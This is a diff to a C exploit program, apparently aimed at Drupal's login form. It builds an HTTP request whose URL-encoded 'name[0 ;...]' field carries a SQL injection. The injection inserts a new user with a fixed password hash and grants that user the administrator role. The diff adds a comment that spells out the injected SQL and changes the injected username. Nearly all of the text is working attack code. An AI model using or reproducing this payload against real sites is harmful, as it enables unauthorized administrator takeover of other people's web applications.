@@ -55,8 +55,16 @@ int main(int argc, char *argv[]) {
     char request[MAXLINE + 1], response[MAXLINE + 1];
     char* ptr;
     char* page = "/?q=node&destination=node";
+    
+    /* Add new user:
+    # insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', 
+             '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
+    #
+    # Set administrator permission (rid = 3):
+    # insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
+    */
     char* payload = "name[0%20;insert+into+users+(status,+uid,+name,+pass)+"
-                    "SELECT+1,+MAX(uid)%2B1,+%27joshua3%27,+"
+                    "SELECT+1,+MAX(uid)%2B1,+%27joshua%27,+"
                     "%27$S$DWRRJaRWFcRFTjpvPsuSu.7CMFuKG3e7uRSI25Yf2a0mZrUYjv44%27+FROM+users;"
                     "insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27joshua%27),+3);;"
                     "#%20%20]=test&name[0]=test&pass=nothing&form_build_id=&form_id=user_login_block&op=Log+in";
